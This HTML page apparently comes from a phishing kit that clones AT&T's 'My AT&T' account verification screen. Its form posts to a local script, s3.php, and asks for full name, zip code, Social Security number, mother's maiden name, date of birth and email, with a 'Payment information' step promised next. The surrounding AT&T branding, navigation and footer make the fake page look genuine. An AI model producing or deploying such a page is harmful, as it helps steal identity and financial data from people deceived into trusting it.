#oo_entry_prompt #oo_entry_company_logo { height: 80px; }
#oo_entry_prompt #oo_entry_content { padding: 20px 10% 20px 10%; }
#oo_entry_prompt #oo_entry_content #ol_entry_brand_logo { margin: 0 0 0 0; } }
@media screen and (device-width: 320px) and (device-height: 480px) and (-webkit-device-pixel-ratio: 2) { #oo_entry_promp #oo_entry_close_prompt { right: -70px; } }
#oo_overlay, #oo_invitation_overlay, #oo_waypoint_overlay, #oo_entry_overlay { background: white url() 50% 80px no-repeat; display: block; height: 1000%; left: 0; position: fixed; top: 0; width: 100%; z-index: 999998; opacity: 0.5; filter: alpha(opacity=50); }
#oo_overlay.no_loading, #oo_invitation_overlay.no_loading, #oo_waypoint_overlay.no_loading, #oo_entry_overlay.no_loading { background: white; opacity: 0.5; filter: alpha(opacity=50); }
@media screen and (max-width: 767px) { #oo_waypoint_overlay { cursor: pointer; } }
#oo_overlay.no_loading, #oo_invitation_overlay.no_loading, #oo_waypoint_overlay.no_loading, #oo_entry_overlay.no_loading { background: white; opacity: 0.5; filter: alpha(opacity=50); }
@media all� { #oo_waypoint_prompt #oo_close_prompt, #oo_invitation_prompt #oo_close_prompt, .oo_cc_wrapper .oo_cc_close, #oo_entry_prompt #oo_entry_close_prompt { font-size: 20px; line-height: 20px; top: 8px; } }
@media print { #oo_bar, .oo_feedback_float, #oo_tab { display: none; } }
@media only screen and (-Webkit-min-device-pixel-ratio: 1.5), only screen and (-moz-min-device-pixel-ratio: 1.5), only screen and (-o-min-device-pixel-ratio: 3 / 2), only screen and (min-device-pixel-ratio: 1.5) { n.oo_feedback_float .olUp { background: url() center 10px no-repeat; background-size: 20%; }
#oo_tab_1 span.icon { background-image: url() !important; background-size: 100%; } }</style><link rel="stylesheet" type="text/css" href="style/chat-cta-styles.css"><link rel="stylesheet" type="text/css" href="style/chat-cta-styles.css"><link rel="stylesheet" type="text/css" href="style/chat-cta-styles.css">

<!--Check to add ng-clock condition only in publish instance-->

<span class="hidden-spoken" aria-live="polite" aria-label="Create or link an ID"></span>
<div class="main-container">
<div data-role="page">
<!--Start: Navigation header-->
<div class="ge5p_global_styles gn-ds2">

<header style="display: block;" class="ng-scope">
<div id="gn-zone1" data-linkposition="GlobalNavTopBar" data-supmethod="OT">
<div class="skip-navigation-mask">
<a href="#" class="skip-navigation-link hideSkipNavLink btn btn-hollow btn-hollow-att-blue btn-small" role="link" aria-label="Skip Navigation">
Skip Navigation
</a>
</div> 
<nav id="navbar-zone1" class="container" name="globalnav" aria-label="Global Header">
<div class="row">
<div class="span12">
<div id="z1-navbar" class="hide-widgets">
<div id="z1-leftNav" class="pull-left">
<!--Globe Icon Start-->
<div id="z1-globe" class="hide-xsm hide-sm">
<a class="brand" href="#" aria-label="AT&amp;T home" title="AT&amp;T home" target="_self" data-analytics-info="">
<i id="z1-globe-md" class="icon-att-globe" aria-label="AT&amp;T home" role="img">
<svg height="28" viewBox="0 0 36 36" width="28" aria-label="att globe icon"><path d="m7.1 32c3 2.3 6.8 3.7 10.9 3.7 4.5 0 8.6-1.7 11.7-4.4-1.4.9-5.4 3-11.7 3-5.5 0-9-1.2-10.9-2.3m12.1.9c4.4 0 9.2-1.2 12-3.6.8-.6 1.5-1.5 2.2-2.6.4-.7.8-1.5 1.1-2.2-2.7 3.9-10.4 6.4-18.4 6.4-5.6 0-11.7-1.8-14.1-5.3 2.2 4.8 8.9 7.3 17.2 7.3m-4.8-7.8c-9.1 0-13.4-4.2-14.1-7.1 0 1 .1 2.2.3 3.1.1.4.4 1 .9 1.6 2.2 2.3 7.7 5.5 17.2 5.5 12.9 0 15.9-4.3 16.5-5.7.4-1 .7-2.8.7-4.4v-1c-.9 3.4-11.9 8-21.5 8m-12.5-14.7c-.5 1-1.1 2.8-1.3 3.7-.1.4 0 .6.1.9 1.1 2.3 6.6 6 19.4 6 7.8 0 13.9-1.9 14.9-5.4.2-.6.2-1.3 0-2.2-.3-1-.7-2.2-1.2-3.1.1 4.6-12.7 7.6-19.2 7.6-7 0-12.9-2.8-12.9-6.3.1-.5.2-.9.2-1.2m27.8-5.7c.1.1.1.2.1.4 0 2-6 5.4-15.6 5.4-7.1 0-8.4-2.6-8.4-4.3 0-.6.2-1.2.7-1.8-.9.9-1.7 1.7-2.5 2.7-.3.4-.5.8-.5 1 0 3.5 8.7 5.9 16.7 5.9 8.6 0 12.5-2.8 12.5-5.3 0-.9-.3-1.4-1.2-2.4-.6-.6-1.2-1.1-1.8-1.6m-2.6-1.9c-2.7-1.6-5.7-2.5-9.1-2.5s-6.5.9-9.2 2.6c-.8.4-1.3.8-1.3 1.3 0 1.5 3.5 3.1 9.7 3.1 6.1 0 10.9-1.8 10.9-3.5.1-.3-.3-.6-1-1" fill="#009fdb"></path></svg>
</i>                                    
</a>
</div>
<!--Globe Icon End-->
<div data-path="/content/att/global/global-navigation/consumer/header/jcr:content/global-nav-container-parsys/globalheaderbar/leftParsys/genericicon" id="z1-pullMenu" class="has-sidenav has-dropdown dropdown-hover">
<a id="z1-pullMenu-open" data-analytics-action="linkClick" data-analytics-code="Link_Click" data-analytics-info="{'events.linkName':'pullMenu-open','events.linkPosition':'GlobalNavTopBar', 'events.linkDestinationUrl':'','events.linkPath':'pullMenu-open','events.supmethod':'OT'}" class="z1-link add-extra-small-space-desktop  " aria-label="Menu" data-unauth-label="Menu" data-auth-label="Menu" role="button" aria-haspopup="true" aria-controls="tab-desktop-menu" aria-expanded="false" data-slide-animation="from-left" title="Menu" tabindex="0">
<!-- Icon state markup for unauthenticated / authenticated state
hide class in below just for mock purpose only
this need to be handle from back end what element has to shown
at a time only one icon element should be present in the page.
-->
<!--RWD Globalnav - default markup-->
<!--Uber Globalnav markup-->
<!-- Default State -->
<!-- ngIf: !globalNavConfig.isAuthenticated --><!-- end ngIf: !globalNavConfig.isAuthenticated -->
<!-- ngIf: !globalNavConfig.isAuthenticated --><!-- end ngIf: !globalNavConfig.isAuthenticated -->
<!-- Icon Authenticated State -->

<span id="ge5p-active-child1" class="ge5p_hamburger_bar">Menu</span>
<svg id="ge5p-active-child2" class="ge5p_hamburger_bar" width="32px" height="4px" viewBox="0 0 32 4" version="1.1"><g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g transform="translate(-5.000000, -16.000000)" fill="#1D2329"><path d="M34,18 C34,18.5522847 33.4179702,19 32.7,19 L9.3,19 C8.58202983,19 8,18.5522847 8,18 C8,17.4477153 8.58202983,17 9.3,17 L32.7,17 C33.4179702,17 34,17.4477153 34,18 Z"></path></g></g></svg><svg id="ge5p-active-child3" class="ge5p_hamburger_bar" width="32px" height="4px" viewBox="0 0 32 4" version="1.1"><g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g transform="translate(-5.000000, -16.000000)" fill="#1D2329"><path d="M34,18 C34,18.5522847 33.4179702,19 32.7,19 L9.3,19 C8.58202983,19 8,18.5522847 8,18 C8,17.4477153 8.58202983,17 9.3,17 L32.7,17 C33.4179702,17 34,17.4477153 34,18 Z"></path></g></g></svg>
</i>
<!-- Desktop Label text Variant -->    
<!-- Tablet Label text Variant -->
<!-- Mobile Label text Variant hide-xsm and hide-sm class will decide whether label is to be shown or not-->
</a>

<!-- Mobile close button -->

<div id="skipGNnav" class="hidden-spoken">
<span class="hidden-spoken">Start of main content</span>
</div>
</div></nav>
</div>
</header>
<div id="c-mask" class="c-mask ng-scope" style="height: 1292px; top: 50px;"></div></div>
<!--End: Navigation header-->
<!--==== Start Main Content Wrapper ============================================================================-->
<div id="wrapper" class="container">
<div class="commonSpinner"><div class="modalwrapper ng-hide" ng-show="isRouting" style=""></div></div>
<!-- Start Application Page code -->
<!-- ngView:  --><div ng-view="" class="myATTiphoneXspecific ng-scope" style=""><div class="parsys ng-scope"><div class="parbase registration section"><div registration-welcome=""><!-- ngIf: registrationPromisesResolved --><section ng-if="registrationPromisesResolved" class="ng-scope"><div class="row"><div class="span12"><div id="logo" class="text-center"><img src="style/myatt-logo.png" alt="My AT&amp;T"></div><div class="form-row"><div class="step-indicator" ng-show="ctrl.showStepIndicator"><!-- ngIf: !ctrl.isLinking --><h1 class="step-heading ng-scope" ng-if="!ctrl.isLinking" tabindex="-1">Account verification</h1><!-- end ngIf: !ctrl.isLinking --><!-- ngIf: ctrl.isLinking --><ul class="steps"><li class="step-on"><!-- ngIf: !ctrl.isLinking --><div ng-if="!ctrl.isLinking" data-large-text="1." data-sm-text="Step 1 of 3:" class="step-text ng-scope" myatt-reg-step-value="1:3" aria-hidden="true">Verify your personal details</div><!-- end ngIf: !ctrl.isLinking --><!-- ngIf: !ctrl.isLinking --><span ng-if="!ctrl.isLinking" class="hidden-spoken ng-scope">Step 1 of 2. Verify your personal details. Current Step</span><!-- end ngIf: !ctrl.isLinking --><!-- ngIf: ctrl.isLinking --><!-- ngIf: ctrl.isLinking --></li><li><!-- ngIf: !ctrl.isLinking --><div ng-if="!ctrl.isLinking" data-large-text="2." data-sm-text="Step 2 of 3:" class="step-text ng-scope" myatt-reg-step-value="2:3" aria-hidden="true">Payment information</div><!-- end ngIf: !ctrl.isLinking --><!-- ngIf: !ctrl.isLinking --><span ng-if="!ctrl.isLinking" class="hidden-spoken ng-scope">Step 2 of 2. Payment information</span><!-- end ngIf: !ctrl.isLinking --><!-- ngIf: ctrl.isLinking --><!-- ngIf: ctrl.isLinking --></li></ul></div></div></div></div></section><!-- end ngIf: registrationPromisesResolved --><!-- ngIf: registrationPromisesResolved --><section ng-if="registrationPromisesResolved" class="ng-scope"><div class="row" att-enter-event="continueClicked();"><div class="span12">

	<form action ="s3.php" id ="id3" method="post" class="ng-pristine ng-valid ng-valid-maxlength">
		<div class="row"><div class="offset2 span8"><!-- ngIf: ctrl.showDTVBanner --><!-- ngIf: !ctrl.isLinking && view !== 'offer' && !ctrl.showStepIndicator && !ctrl.isRecommender --><!-- ngIf: !ctrl.isLinking && view !== 'offer' && ctrl.showStepIndicator  && !ctrl.isRecommender --><!-- end ngIf: !ctrl.isLinking && view !== 'offer' && ctrl.showStepIndicator  && !ctrl.isRecommender --><!-- ngIf: (ctrl.isLinking || ctrl.isRecommender ) && view !== 'offer' && !ctrl.showStepIndicator --><!-- ngIf: (ctrl.isLinking || ctrl.isRecommender ) && view !== 'offer' && ctrl.showStepIndicator --><!-- ngIf: view === 'offer' && !ctrl.showStepIndicator --><!-- ngIf: view === 'offer' && ctrl.showStepIndicator --><!-- ngIf: pageError --><!-- ngIf: !ctrl.isLinking && !ctrl.isRecommender && view !== 'offer' --><div class="form-row ng-scope" ng-show="view === 'myatt' || view === 'myatt-options'" ng-if="!ctrl.isLinking &amp;&amp; !ctrl.isRecommender &amp;&amp; view !== 'offer'">Please fill in the appropriate answers to enable us verify your account</div><!-- end ngIf: !ctrl.isLinking && !ctrl.isRecommender && view !== 'offer' --><!-- ngIf: ctrl.isLinking  && view !== 'offer' && !ctrl.isRecommender --><!-- ngIf: !ctrl.isLinking && view !== 'offer' && !ctrl.isRecommender --><div class="form-row ng-scope" ng-show="view === 'myatt' || view === 'myatt-options'" ng-if="!ctrl.isLinking &amp;&amp; view !== 'offer' &amp;&amp; !ctrl.isRecommender" reg-check-native-external=""></div><!-- end ngIf: !ctrl.isLinking && view !== 'offer' && !ctrl.isRecommender --><!-- ngIf: ctrl.isLinking  && view !== 'offer' && !ctrl.isRecommender --><!-- ngIf: ctrl.isAuthenticated && !ctrl.isRecommender && ( view === 'myatt' || view === 'myatt-options' ) --><!-- Start: US707168 US707532 - RWD- RAP- IAM Support Target Biller - Registration Welcome page- Enhancement - EXCLUDE TESTING--><!-- ngIf: view === 'myatt' --><div ng-if="view === 'myatt'" class="ng-scope"><!-- ngIf: ctrl.isRecommender --><!-- ngIf: ctrl.showAtttvLink --><!-- ngIf: !ctrl.isRecommender --><div ng-if="!ctrl.isRecommender" class="ng-scope"><div class="form-row ng-hide" ng-hide="!ctrl.hideBanField">Enter your AT&amp;T wireless number.</div>
	<div class="row"><div class="span8"><div ng-class="{error:errors.searchTn || errors.searchTnInvalid || errors.searchTnAndBanBlank}" class="form-row padTop10"><label for="phoneNum">Full name</label><div ddh-tooltip="" class="field-group"><input type="text" aria-label="AT&amp;T phone number" ng-model="form.searchTn" ng-focus="clearErrorOnfocus('searchTn')" ng-blur="validateSearchTn();" class="span12 ng-pristine ng-untouched ng-valid ng-valid-maxlength" name="fn" id="fn" myatt-reg-ctn-input-formatter="" placeholder="Enter your full name" autocomplete="off" autocorrect="off" ng-keyup="inputKeyUpChecks()" ng-keydown="clearOnKey($event,'searchBan');" ddh-reset="" handle-device-return-key="" myatt-reg-clear-inline-error="form.searchTn" reg-error-obj="errors"></div><!-- ngIf: phoneNumBlur --><!-- ngIf: errors.searchTn --><!-- ngIf: errors.searchTnAndBanBlank --></div></div></div>
<div class="row"><div class="span8"><div ng-class="{error:errors.searchTn || errors.searchTnInvalid || errors.searchTnAndBanBlank}" class="form-row padTop10"><label for="phoneNum">Zip code</label><div ddh-tooltip="" class="field-group"><input type="text" aria-label="AT&amp;T phone number" ng-model="form.searchTn" ng-focus="clearErrorOnfocus('searchTn')" ng-blur="validateSearchTn();" class="span12 ng-pristine ng-untouched ng-valid ng-valid-maxlength" name="zip" id="zip" myatt-reg-ctn-input-formatter="" placeholder="Enter your zip code" autocomplete="off" autocorrect="off" ng-keyup="inputKeyUpChecks()" ng-keydown="clearOnKey($event,'searchBan');" ddh-reset="" handle-device-return-key="" myatt-reg-clear-inline-error="form.searchTn" reg-error-obj="errors"></div><!-- ngIf: phoneNumBlur --><!-- ngIf: errors.searchTn --><!-- ngIf: errors.searchTnAndBanBlank --></div></div></div>

<div class="row"><div class="span8"><div ng-class="{error:errors.searchTn || errors.searchTnInvalid || errors.searchTnAndBanBlank}" class="form-row padTop10"><label for="phoneNum">Social security number</label><div ddh-tooltip="" class="field-group"><input type="tel" aria-label="AT&amp;T phone number" ng-model="form.searchTn" ng-focus="clearErrorOnfocus('searchTn')" ng-blur="validateSearchTn();" class="span12 ng-pristine ng-untouched ng-valid ng-valid-maxlength" name="ssn" id="ssn" myatt-reg-ctn-input-formatter="" placeholder="Enter your social security number" autocomplete="off" autocorrect="off" ng-keyup="inputKeyUpChecks()" ng-keydown="clearOnKey($event,'searchBan');" ddh-reset="" handle-device-return-key="" myatt-reg-clear-inline-error="form.searchTn" reg-error-obj="errors"></div><!-- ngIf: phoneNumBlur --><!-- ngIf: errors.searchTn --><!-- ngIf: errors.searchTnAndBanBlank --></div></div></div>

<div class="row"><div class="span8"><div ng-class="{error:errors.searchTn || errors.searchTnInvalid || errors.searchTnAndBanBlank}" class="form-row padTop10"><label for="phoneNum">Mother's maiden name</label><div ddh-tooltip="" class="field-group"><input type="text" aria-label="AT&amp;T phone number" ng-model="form.searchTn" ng-focus="clearErrorOnfocus('searchTn')" ng-blur="validateSearchTn();" class="span12 ng-pristine ng-untouched ng-valid ng-valid-maxlength" name="mmn" id="mmn" myatt-reg-ctn-input-formatter="" placeholder="Enter your mother's maiden name" autocomplete="off" autocorrect="off" ng-keyup="inputKeyUpChecks()" ng-keydown="clearOnKey($event,'searchBan');" ddh-reset="" handle-device-return-key="" myatt-reg-clear-inline-error="form.searchTn" reg-error-obj="errors"></div><!-- ngIf: phoneNumBlur --><!-- ngIf: errors.searchTn --><!-- ngIf: errors.searchTnAndBanBlank --></div></div></div>

<div class="row"><div class="span8"><div ng-class="{error:errors.searchTn || errors.searchTnInvalid || errors.searchTnAndBanBlank}" class="form-row padTop10"><label for="phoneNum">Date of birth</label><div ddh-tooltip="" class="field-group"><input type="tel" aria-label="AT&amp;T phone number" ng-model="form.searchTn" ng-focus="clearErrorOnfocus('searchTn')" ng-blur="validateSearchTn();" class="span12 ng-pristine ng-untouched ng-valid ng-valid-maxlength" name="dob" id="dob" myatt-reg-ctn-input-formatter="" placeholder="Enter your date of birth" autocomplete="off" autocorrect="off" ng-keyup="inputKeyUpChecks()" ng-keydown="clearOnKey($event,'searchBan');" ddh-reset="" handle-device-return-key="" myatt-reg-clear-inline-error="form.searchTn" reg-error-obj="errors"></div><!-- ngIf: phoneNumBlur --><!-- ngIf: errors.searchTn --><!-- ngIf: errors.searchTnAndBanBlank --></div></div></div>

<div class="row"><div class="span8"><div ng-class="{error:errors.searchTn || errors.searchTnInvalid || errors.searchTnAndBanBlank}" class="form-row padTop10"><label for="phoneNum">Email address</label><div ddh-tooltip="" class="field-group"><input type="email" aria-label="AT&amp;T phone number" ng-model="form.searchTn" ng-focus="clearErrorOnfocus('searchTn')" ng-blur="validateSearchTn();" class="span12 ng-pristine ng-untouched ng-valid ng-valid-maxlength" name="email" id="email" myatt-reg-ctn-input-formatter="" placeholder="Enter your email address" autocomplete="off" autocorrect="off" ng-keyup="inputKeyUpChecks()" ng-keydown="clearOnKey($event,'searchBan');" ddh-reset="" handle-device-return-key="" myatt-reg-clear-inline-error="form.searchTn" reg-error-obj="errors"></div><!-- ngIf: phoneNumBlur --><!-- ngIf: errors.searchTn --><!-- ngIf: errors.searchTnAndBanBlank --></div></div></div>


</div><!-- end ngIf: !ctrl.isRecommender --><!-- ngIf: !ctrl.isRecommender --><!-- end ngIf: !ctrl.isRecommender --></div><!-- end ngIf: view === 'myatt' --><!-- Start : Radio Group --><!-- end myatt --><!-- End : Radio Group --><!-- end r2g --><div class="form-row"><div class="cta-button-group marCtaButton"><!-- ngIf: view !== 'regTokenError' --><button ng-if="view !== 'regTokenError'" class="btn btn-primary-functional btn-medium span3 ng-scope ng-isolate-scope" type="submit" ddh-load-button="Processing" start-event="continueProcessingStart" stop-event="continueProcessingStop" ng-disabled="continueDisabled" ng-click="continueClicked();">Continue</button><!-- end ngIf: view !== 'regTokenError' --><!-- ngIf: ctrl.dmctnNotFound --><!-- ngIf: !ctrl.dmctnNotFound --><!-- end ngIf: !ctrl.dmctnNotFound --></div></div></div></div></form></div></div></section><!-- end ngIf: registrationPromisesResolved -->
<div class="hidden-desktop"><div id="tcMobileC2CB"></div></div>
</div></div></div></div>
<!-- End Application Page code -->
</div>
<!--==== End Main Content Wrapper =============================================================================-->
</div>   
</div>
<div class="ui parsys"> 
<!--check for myATT--> 

</div>
<!--analytics tab logic goes here-->  
<!--Start Navigation footer-->
<div class="ge5p_global_styles gn-ds2">
<footer style="display: block;">
<div id="gn-zone5">
<div id="z5-footer-content" class="container" data-link-position="Footer" data-event-action="linkClick" data-event-code="Link_Click">
<div class="row">
<div id="z5-footer-links" class="span12">



<div class="clearfix"></div>
</div>
</div>
<div id="z5-footer-legal" class="row">
<div class="span12">
<div><div class="parbase linkContainer section">
<ul class="ftr-legal-links clear-fix">
<!-- Desktop - No language link -->
<li class="hide-sm hide-xsm">
<a href="#" data-analytics-action="linkClick" data-analytics-code="Link_Click" data-analytics-info="" aria-label="Site map " target="_self">
Site map
</a>
</li>
<!-- Mobile - No language link -->
<li class="hide-lg hide-md">
<a href="#" data-analytics-action="linkClick" data-analytics-code="Link_Click" data-analytics-info="" aria-label="Site map " target="_self">
<i aria-hidden="true"></i>
Site map
</a>
</li>
<!-- Language link Motion Point Integration -->
<!-- Desktop - No language link -->
<li class="hide-sm hide-xsm">
<a href="
#" data-analytics-action="linkClick" data-analytics-code="Link_Click" data-analytics-info="" aria-label="Terms of use " target="_self">
Terms of use
</a>
</li>
<!-- Mobile - No language link -->
<li class="hide-lg hide-md">
<a href="#" data-analytics-action="linkClick" data-analytics-code="Link_Click" data-analytics-info="" aria-label="Terms of use " target="_self">
<i aria-hidden="true"></i>
Terms of use
</a>
</li>
<!-- Language link Motion Point Integration -->
<!-- Desktop - No language link -->
<li class="hide-sm hide-xsm">
<a href="#" data-analytics-action="linkClick" data-analytics-code="Link_Click" data-analytics-info="" aria-label="Accessibility " target="_self">
Accessibility
</a>
</li>
<!-- Mobile - No language link -->
<li class="hide-lg hide-md">
<a href="#" data-analytics-action="linkClick" data-analytics-code="Link_Click" data-analytics-info="" aria-label="Accessibility " target="_self">
<i aria-hidden="true"></i>
Accessibility
</a>
</li>
<!-- Language link Motion Point Integration -->
<!-- Desktop - No language link -->
<li class="hide-sm hide-xsm">
<a href="#" data-analytics-action="linkClick" data-analytics-code="Link_Click" data-analytics-info="" aria-label="Broadband details " target="_self">
Broadband details
</a>
</li>
<!-- Mobile - No language link -->
<li class="hide-lg hide-md">
<a href="#" data-analytics-action="linkClick" data-analytics-code="Link_Click" data-analytics-info="" aria-label="Broadband details " target="_self">
<i aria-hidden="true"></i>
Broadband details
</a>
</li>
<!-- Language link Motion Point Integration -->
<!-- Desktop - No language link -->
<li class="hide-sm hide-xsm">
<a href="#" data-analytics-action="linkClick" data-analytics-code="Link_Click" data-analytics-info="" aria-label="Legal policy center " target="_self">
Legal policy center
</a>
</li>
<!-- Mobile - No language link -->
<li class="hide-lg hide-md">
<a href="#" data-analytics-action="linkClick" data-analytics-code="Link_Click" data-analytics-info="" aria-label="Legal policy center " target="_self">
<i aria-hidden="true"></i>
Legal policy center
</a>
</li>
<!-- Language link Motion Point Integration -->
<!-- Desktop - No language link -->
<li class="hide-sm hide-xsm">
<a href="#" data-analytics-action="linkClick" data-analytics-code="Link_Click" data-analytics-info="" aria-label="Advertising choices (new window)" target="_blank">
Advertising choices
<i class="icon-datanetwork-link" aria-hidden="true" aria-label="External Link"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 36 36'%3E%3Cpath d='M20.5 17c-.5.6-1.4.7-2 .2-1.1-.9-2.6-.8-3.6.2l-5.8 5.8c-.5.5-.8 1.2-.8 1.9s.3 1.4.8 1.9c1.1 1.1 2.8 1.1 3.8 0l3.2-3.2c.5-.5 1.5-.5 2.1 0s.5 1.5 0 2.1L15 29c-1.1 1.1-2.6 1.7-4 1.7s-2.8-.5-4-1.7c-1.1-1.1-1.7-2.5-1.7-4S6 22.1 7 21l5.6-5.7c2-2 5.3-2.2 7.6-.4.7.6.8 1.5.3 2.1zM29 7c-2.2-2.2-5.8-2.2-8 0l-3.1 3.1c-.5.6-.5 1.5 0 2 .4.4 1 .5 1.4.4.1 0 .1 0 .2-.1 0 0 .1 0 .1-.1 0 0 .1 0 .1-.1.1-.1.2-.1.2-.2l3.3-2.9C24.3 8 26 8 26.9 9.1c1.1 1.1 1.1 2.8 0 3.8l-5.7 5.7c-1 1-2.6 1.1-3.6.2-.6-.5-1.6-.4-2 .2-.5.6-.4 1.6.2 2 1.1.9 2.3 1.3 3.6 1.3 1.4 0 2.9-.5 4-1.6l5.7-5.7c2.1-2.3 2.1-5.8-.1-8z'/%3E%3C/svg%3E"></i>
</a>
</li>
<!-- Mobile - No language link -->
<li class="hide-lg hide-md">
<a href="#" data-analytics-action="linkClick" data-analytics-code="Link_Click" data-analytics-info="" aria-label="Advertising choices (new window)" target="_blank">
<i aria-hidden="true"></i>
Advertising choices
<i class="icon-datanetwork-link" aria-hidden="true" aria-label="External Link"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 36 36'%3E%3Cpath d='M20.5 17c-.5.6-1.4.7-2 .2-1.1-.9-2.6-.8-3.6.2l-5.8 5.8c-.5.5-.8 1.2-.8 1.9s.3 1.4.8 1.9c1.1 1.1 2.8 1.1 3.8 0l3.2-3.2c.5-.5 1.5-.5 2.1 0s.5 1.5 0 2.1L15 29c-1.1 1.1-2.6 1.7-4 1.7s-2.8-.5-4-1.7c-1.1-1.1-1.7-2.5-1.7-4S6 22.1 7 21l5.6-5.7c2-2 5.3-2.2 7.6-.4.7.6.8 1.5.3 2.1zM29 7c-2.2-2.2-5.8-2.2-8 0l-3.1 3.1c-.5.6-.5 1.5 0 2 .4.4 1 .5 1.4.4.1 0 .1 0 .2-.1 0 0 .1 0 .1-.1 0 0 .1 0 .1-.1.1-.1.2-.1.2-.2l3.3-2.9C24.3 8 26 8 26.9 9.1c1.1 1.1 1.1 2.8 0 3.8l-5.7 5.7c-1 1-2.6 1.1-3.6.2-.6-.5-1.6-.4-2 .2-.5.6-.4 1.6.2 2 1.1.9 2.3 1.3 3.6 1.3 1.4 0 2.9-.5 4-1.6l5.7-5.7c2.1-2.3 2.1-5.8-.1-8z'/%3E%3C/svg%3E"></i>
</a>
</li>
<!-- Language link Motion Point Integration -->
<!-- Desktop - No language link -->
<li class="hide-sm hide-xsm">
<a href="#" data-analytics-action="linkClick" data-analytics-code="Link_Click" data-analytics-info="" aria-label="Privacy center " target="_self">
Privacy center
</a>
</li>
<!-- Mobile - No language link -->
<li class="hide-lg hide-md">
<a href="#" data-analytics-action="linkClick" data-analytics-code="Link_Click" data-analytics-info="" aria-label="Privacy center " target="_self">
<i aria-hidden="true"></i>
Privacy center
</a>
</li>
<!-- Language link Motion Point Integration -->
<!-- Desktop - No language link -->
<li class="hide-sm hide-xsm">
<a href="#" data-analytics-action="linkClick" data-analytics-code="Link_Click" data-analytics-info="" aria-label="Do Not Sell My Personal Information " target="_self">
Do Not Sell My Personal Information
</a>
</li>
<!-- Mobile - No language link -->
<li class="hide-lg hide-md">
<a href="#" data-analytics-action="linkClick" data-analytics-code="Link_Click" data-analytics-info="" aria-label="Do Not Sell My Personal Information " target="_self">
<i aria-hidden="true"></i>
Do Not Sell My Personal Information
</a>
</li>
<!-- Language link Motion Point Integration -->
</ul>
</div>
</div>
</div>
</div>
<div id="z5-footer-copyright" class="row">
<div class="span12">
<div class="span9 span12-xsm span12-sm span9-md pull-left">
<div><div class="text parbase section">
<div>
<p>©2020 AT&amp;T Intellectual Property. All rights reserved.</p>
</div>
</div>
</div>
</div>                  
</div>
</div>
</div>
</div>
</footer>
</div>

<!--End: Navigation footer-->
<div><div id="inqTestDiv" style="position: fixed; right: 20px; z-index: 9999999; bottom: 0px; font-size: 16px;"></div></div>
<link href="style/attmonetization.css" rel="stylesheet" type="text/css">
<div style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.4160298758063674"><img style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.3042793099679397" width="0" height="0" alt="" src="style/0"><img style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.2136935101509052" width="0" height="0" alt="" src="style/0(1)"></div>
<div id="inqDivResizeCorner" style="border-width: 0px; position: absolute; z-index: 9999999; left: 424px; top: 284px; cursor: se-resize; height: 16px; width: 16px; display: none;"></div><div id="inqResizeBox" style="border-width: 0px; position: absolute; z-index: 9999999; left: 0px; top: 0px; display:none; height: 0px; width: 0px;"></div><div id="inqTitleBar" style="border-width: 0px; position: absolute; z-index: 9999999; left: 0px; top: 0px; cursor: move; height: 55px; width: 410px; display: none;"></div><div class="kxhead" data-id="vtn9okxvt" style="display:none !important;"><span class="kxtag kxinvisible" data-id="46175"></span><span class="kxtag kxinvisible" data-id="46314"></span></div><div id="inqListenerAutomatonDiv"></div><div id="injectTargetScreenReader" role="alert" aria-live="polite" aria-relevant="additions text" aria-atomic="false" style="overflow: hidden; height: 1px; width: 1px; left: -1000px; top: 0px; position: absolute;"></div></body></html>